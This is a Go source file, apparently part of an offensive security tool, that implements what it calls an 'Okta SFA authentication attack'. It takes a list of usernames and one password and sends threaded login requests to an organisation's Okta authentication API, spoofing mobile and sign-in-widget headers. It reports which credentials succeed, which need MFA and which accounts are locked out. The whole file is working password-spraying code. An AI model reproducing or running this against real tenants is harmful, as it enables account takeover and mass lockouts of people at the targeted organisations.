package mfa

import (
	"fmt"
	"strings"
	"time"

	"github.com/mr-pmillz/dauthi/utils"
)

// MDMA ...
type MDMA struct {
	Opts utils.ChargeOpts
	Logr *utils.Logger
	Cycle
}

// Cycle ...
type Cycle struct {
	Buff   *chan bool
	Block  *chan bool
	Length int
	API    *utils.API
}

const (
	Usage = `
  MFA Options:
    -a                     User-Agent for request [default: Agent/20.08.0.23/Android/11]
	`

	// Methods are available tool methods
	Methods = `
  MFA Methods:
    Auth-okta              Okta SFA authentication attack
	`

	oktaAuthAPI = `https://%s.okta.com/api/v1/authn`

	oktaAuthPOST = `{"options": {"warnBeforePasswordExpired": true, "multiOptionalFactorEnroll": true}, ` +
		`"subdomain": "%s", "username": "%s", "password": "%s"}`
	_authOkta = "Auth-okta"
)

// Init MDMA with default values and return obj
func Init(o utils.ChargeOpts) *MDMA {
	if o.Agent == "" {
		o.Agent = "Agent/20.08.0.23/Android/11"
	}
	log := utils.NewLogger("multi-factor")

	return &MDMA{
		Opts: o,
		Logr: log,
		Cycle: Cycle{
			API: &utils.API{
				Debug: o.Debug,
				Log:   log,
				Proxy: o.Proxy},
		},
	}
}

// Clone copies an *MDMA for process threading
func (m *MDMA) Clone() *MDMA {
	clone := Init(m.Opts) // assign target
	clone.Cycle.Block = m.Cycle.Block
	clone.Cycle.Buff = m.Cycle.Buff

	return clone
}

// Parser wrapper to parse JSON/XML objects
func (m *MDMA) Parser(data interface{}, p string) bool {
	switch p {
	case "json":
		err := m.Cycle.API.Resp.ParseJSON(data)
		if err != nil {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
			return true
		}

	case "xml":
		err := m.Cycle.API.Resp.ParseXML(data)
		if err != nil {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
			return true
		}
	}

	return false
}

// Auth ...
func (m *MDMA) Auth() {
	var file []byte
	var err error

	if m.Opts.File != "" {
		file, err = utils.ReadFile(m.Opts.File)
		if err != nil {
			m.Logr.Fatalf([]interface{}{m.Opts.File}, "File Read Failure")
		}
	}

	lines := strings.Split(string(file), "\n")
	block := make(chan bool, m.Opts.Threads)
	buff := make(chan bool, len(lines))
	m.Cycle.Block = &block
	m.Cycle.Buff = &buff
	m.Cycle.Length = len(lines)

	m.Logr.Infof([]interface{}{m.Opts.Method}, "threading %d values across %d threads", m.Cycle.Length, m.Opts.Threads)

	for _, line := range lines {
		if len(lines) > 1 && line == "" {
			*m.Cycle.Buff <- false
			continue
		}

		target := m.Clone() // assign target

		if line == "" {
			_ = target.Opts.UserName
		} else {
			target.Opts.UserName = line
		}

		switch m.Opts.Method {
		case _authOkta:
			target.Cycle.API.Name = target.Opts.Method
			target.Cycle.API.URL = fmt.Sprintf(oktaAuthAPI, target.Opts.Endpoint)
			target.Cycle.API.Data = fmt.Sprintf(oktaAuthPOST, target.Opts.Endpoint, target.Opts.UserName, target.Opts.Password)
			target.Cycle.API.Method = `POST`
			target.Cycle.API.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"X-Requested-With":           []string{"XMLHttpRequest"},
					"X-Okta-User-Agent-Extended": []string{"okta-signin-widget-5.14.1"},
					"User-Agent":                 []string{target.Opts.Agent},
					"Accept":                     []string{"application/json"},
					"Content-Type":               []string{"application/json"}}}

		default:
			m.Logr.Failf([]interface{}{m.Opts.Method}, "Unknown Method Called")
		}
		target.Thread()
	}

	for i := 0; i < m.Cycle.Length; i++ {
		<-*m.Cycle.Buff
	}
	close(*m.Cycle.Block)
	close(*m.Cycle.Buff)
}

// Thread represents the threading process to loop multiple requests
func (m *MDMA) Thread() {
	*m.Cycle.Block <- true
	go func() {
		m.Cycle.API.WebCall()

		if m.Cycle.API.Resp.Status == 0 {
			if m.Opts.Miss < m.Opts.Retry {
				m.Opts.Miss++
				m.Logr.Infof([]interface{}{m.Opts.Endpoint, m.Opts.UserName, m.Opts.Password}, "Retrying Request")
				<-*m.Cycle.Block
				m.Thread()
				return
			}
			m.Logr.Failf([]interface{}{m.Opts.Endpoint, m.Opts.UserName, m.Opts.Password}, "Null Server Response")
		}
		m.Validate()

		// Sleep interval through Thread loop
		time.Sleep(time.Duration(m.Opts.Sleep) * time.Second)
		<-*m.Cycle.Block
		*m.Cycle.Buff <- true
	}()
}

func (m *MDMA) Validate() {
	if m.Opts.Method == _authOkta {
		var check struct {
			Status string `json:"status"`
			Error  string `json:"errorSummary"`
		}
		if m.Parser(&check, "json") {
			return
		}
		if check.Status != "" {
			switch {
			case check.Status == "MFA_ENROLL":
				m.Logr.Successf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Authentication Successful - MFA REQUIRED")
			case check.Status == "LOCKED_OUT":
				m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Authentication Failed - Account Locked")
			default:
				m.Logr.Successf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Authentication Successful")
			}
		} else {
			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password}, "%s", check.Error)
		}
	}
}

// Call represents the switch function for activating all class methods
func (m *MDMA) Call() {
	switch m.Opts.Method {
	case _authOkta:
		if m.Opts.Email == "" && m.Opts.File == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Email/File required")
			return
		}
		m.Opts.UserName = m.Opts.Email
		m.Auth()

	default:
		m.Logr.StdOut(Methods)
		m.Logr.Fatalf(nil, "Invalid Method Selected %v", m.Opts.Method)
	}
}
